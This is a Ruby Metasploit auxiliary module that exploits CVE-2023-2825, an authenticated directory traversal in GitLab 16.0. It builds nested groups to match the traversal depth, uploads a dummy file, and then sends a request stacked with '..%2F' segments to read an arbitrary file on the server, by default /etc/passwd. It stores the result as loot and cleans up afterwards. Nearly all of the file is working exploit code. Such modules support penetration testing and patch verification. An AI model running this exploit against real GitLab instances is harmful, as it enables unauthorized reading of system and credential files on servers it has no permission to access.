##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  # include Msf::Exploit::Git::SmartHttp
  include Msf::Exploit::Remote::HttpClient
  # include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::Remote::HTTP::Gitlab
  # include Msf::Exploit::RubyDeserialization
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  attr_accessor :cookie

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GitLab Authenticated File Read',
        'Description' => %q{
          Gitlab version 16.0 contains a directory traversal for arbitrary file read as the gitlab user.
          In order to exploit this vulnerability, a user must be able to create a project and groups.
          When exploiting this vulnerability, a group (or subgroup under the group) must be created
          for each level of the traversal. If the depth is 11 for the dir traversal, then a group
          and 10 sub-groups will be created. Lastly a project is created for that subgroup.
          With all these requirements satisfied a dummy file is uploaded, and the full
          traversal is then executed. Cleanup is performed by deleting the first group which
          cascades to deleting all other objects created.

          Tested on Docker image of gitlab 16.0
        },
        'Author' => [
          'h00die', # msf module
          'pwnie', # discovery on hackerone
          'Vitellozzo', # PoC on github
        ],
        'References' => [
          ['URL', 'https://about.gitlab.com/releases/2023/05/23/critical-security-release-gitlab-16-0-1-released/'],
          ['URL', 'https://github.com/Occamsec/CVE-2023-2825'],
          ['URL', 'https://labs.watchtowr.com/gitlab-arbitrary-file-read-gitlab-cve-2023-2825-analysis/'],
          ['CVE', '2023-2825']
        ],
        'DisclosureDate' => '2023-05-23',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'The username to authenticate as', nil]),
        OptString.new('PASSWORD', [true, 'The password for the specified username', nil]),
        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal (also groups creation)', 11]),
        OptString.new('File', [true, 'File to read', '/etc/passwd'])
      ]
    )
    deregister_options('GIT_URI')
  end

  def get_csrf(body)
    body =~ /"csrf-token" content="([^"]+)"/
    ::Regexp.last_match(1)
  end

  def check_host(_ip)
    # check method almost entirely borrowed from gitlab_github_import_rce_cve_2022_2992
    self.cookie = gitlab_sign_in(datastore['USERNAME'], datastore['PASSWORD']) unless cookie

    vprint_status('Trying to get the GitLab version')

    version = Rex::Version.new(gitlab_version)

    return CheckCode::Safe("Detected GitLab version #{version} which is not vulnerable") unless (
      version == Rex::Version.new('16.0.0')
    )

    report_vuln(
      host: rhost,
      name: name,
      refs: references,
      info: [version]
    )
    return Exploit::CheckCode::Appears("Detected GitLab version #{version} which is vulnerable.")
  rescue Msf::Exploit::Remote::HTTP::Gitlab::Error::AuthenticationError
    return Exploit::CheckCode::Detected('Could not detect the version because authentication failed.')
  rescue Msf::Exploit::Remote::HTTP::Gitlab::Error => e
    return Exploit::CheckCode::Unknown("#{e.class} - #{e.message}")
  end

  def run_host(ip)
    self.cookie = gitlab_sign_in(datastore['USERNAME'], datastore['PASSWORD']) unless cookie
    # get our csrf token
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path)
    })
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected Respones Code (response code: #{res.code})") unless res.code == 200
    csrf_token = get_csrf(res.body)
    vprint_good("CSRF Token: #{csrf_token}")

    # create nested groups to the appropriate depth
    print_status("Creating #{datastore['DEPTH']} groups")
    parent_id = ''
    first_group = ''
    (1..datastore['DEPTH']).each do |_|
      name = Rex::Text.rand_text_alphanumeric(8, 10)
      first_group = name if first_group.empty?
      vprint_status("Creating group: #{name} with parent id: #{parent_id}")
      # a success will give a 302 and direct us to /<group_name>
      res = send_request_cgi!({
        'uri' => normalize_uri(target_uri.path, 'groups'),
        'method' => 'POST',
        'vars_post' => {
          'group[parent_id]' => parent_id,
          'group[name]' => name,
          'group[path]' => name,
          'group[visibility_level]' => 20,
          'user[role]' => 'software_developer',
          'group[jobs_to_be_done]' => '',
          'authenticity_token' => csrf_token
        }
      })
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected Respones Code (response code: #{res.code})") unless res.code == 200
      csrf_token = get_csrf(res.body)
      vprint_good("CSRF Token: #{csrf_token}")

      # grab our parent group ID for nesting
      res.body =~ /data-clipboard-text="([^"]+)" type="button" title="Copy group ID"/
      parent_id = ::Regexp.last_match(1)
    end

    # create a new project

    project_name = Rex::Text.rand_text_alphanumeric(8, 10)
    print_status("Creating project #{project_name}")
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'projects'),
      'method' => 'POST',
      'vars_post' => {
        'project[ci_cd_only]' => 'false',
        'project[name]' => project_name,
        'project[selected_namespace_id]' => parent_id,
        'project[namespace_id]' => parent_id,
        'project[path]' => project_name,
        'project[visibility_level]' => 20,
        'project[initialize_with_readme]' => 1, # The POC is missing a ] here, fingerprintable?
        'authenticity_token' => csrf_token
      }
    })
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected Respones Code (response code: #{res.code})") unless res.code == 302
    csrf_token = get_csrf(res.body)

    project_id = res.headers['Location'].to_s.split('/')[3..].join('/') # strip off http[s]://ip/, seems like there should be a better way to do this though
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, project_id)
    })
    csrf_token = get_csrf(res.body)

    # upload a dummy file
    print_status('Creating a dummy file in project')
    file_name = Rex::Text.rand_text_alphanumeric(8, 10)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, project_id, 'uploads'),
      'method' => 'POST',
      'headers' => {
        'X-CSRF-Token' => csrf_token,
        'Accept' => '*/*' # required or you get a 404
      },
      'vars_form_data' => [
        {
          'name' => 'file',
          'filename' => file_name,
          'data' => Rex::Text.rand_text_alphanumeric(4, 25)
        }
      ]
    })
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected Respones Code (response code: #{res.code})") unless res.code == 200
    res = res.get_json_document
    file_url = res['link']['url']
    # remove our file name
    file_url = file_url.gsub("/#{file_name}", '')

    # finally, read our file
    print_status('Executing dir traversal')
    target_file = datastore['FILE']
    target_file = target_file.gsub('/', '%2F')
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, project_id, file_url, '..%2F' * datastore['DEPTH'] + "..#{target_file}"),
      'headers' => {
        'Accept' => '*/*' # required or you get a 404
      }
    })
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    if res.code == 500
      print_error("Unable to read file (permissions, or file doens't exist)")
    elsif res.code != 200
      print_error("#{peer} - Unexpected Respones Code (response code: #{res.code})") # don't fail_with so we can cleanup
    end

    if !res.body.empty? && res.code == 200
      print_good(res.body)
      loot_path = store_loot('Gitlab file', 'text/plain', ip, res.body, datastore['FILE'])
      print_good("#{datastore['FILE']} saved to #{loot_path}")
    elsif res.body.empty?
      print_error('Response has 0 size.')
    else
      print_error('Bad response, initiating cleanup')
    end

    # deleting the first group will delete the sub-groups and project
    print_status("Deleting group #{first_group}")
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, first_group),
      'method' => 'POST',
      'vars_post' => {
        'authenticity_token' => csrf_token,
        '_method' => 'delete'
      }
    })
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected Respones Code (response code: #{res.code})") unless res.code == 302
  end
end
